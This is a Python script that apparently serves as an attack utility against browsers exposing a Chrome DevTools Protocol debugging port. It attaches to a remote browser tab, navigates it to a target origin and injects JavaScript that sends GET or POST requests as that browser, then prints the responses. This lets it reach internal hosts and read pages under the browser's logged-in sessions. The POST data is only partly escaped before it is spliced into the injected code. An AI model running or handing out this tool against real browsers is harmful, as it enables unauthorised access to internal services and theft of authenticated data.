import pydevtools
from urllib.parse import urlparse
import argparse

fetcher_code = """
var req = new XMLHttpRequest();
req.open("GET", "%s", false); 
req.send(null);
req.responseText
"""
fetcher_code_post = """
var req = new XMLHttpRequest();
req.open("POST", "%s", false); 
req.send("%s");
req.responseText
"""

def remote_fetch(purl, addr, port):
    

    chrome = pydevtools.ChromeInterface(host=addr,port=port)
    
    target = chrome.Target.getTargets()
    sessionid = chrome.Target.attachToTarget(targetId=target[0]["result"]["targetInfos"][0]['targetId'], flatten=True)
    #print("[+] got session ID:", sessionid[0]["result"]["sessionId"])
    
    chrome.sessionId = sessionid[0]["result"]["sessionId"]
    chrome.message_counter = 0
    
    chrome.Page.enable()
    chrome.Page.navigate(url=purl.scheme+"://"+purl.netloc+"/")
    chrome.Runtime.enable()
    
    resp = chrome.Runtime.evaluate(expression=fetcher_code) # you can start doing browsing here!
    print(resp[0]["result"]["result"]["value"])

if __name__ == "__main__":

    p = argparse.ArgumentParser()
    p.add_argument('-target', action='store', required=True, help="a host:port string to connect to CDP")
    p.add_argument('-url', action='store', required=True, help="the URL to fetch with a GET/POST request")
    p.add_argument('-postdata', action='store', default="", help="data for a POST request")

	
    options = p.parse_args()
    try:
        host, port = options.target.split(":")
        port = int(port)
        purl = urlparse(options.url)
    except Exception as e:
        print("[?] invalid args:", e)
        p.print_help()
        exit(1)

    if options.postdata != "":
        fetcher_code = fetcher_code_post % (purl.path, options.postdata.replace("\"", "\\\"")) 
    else:
        fetcher_code = fetcher_code % purl.path

    remote_fetch(purl, host, port)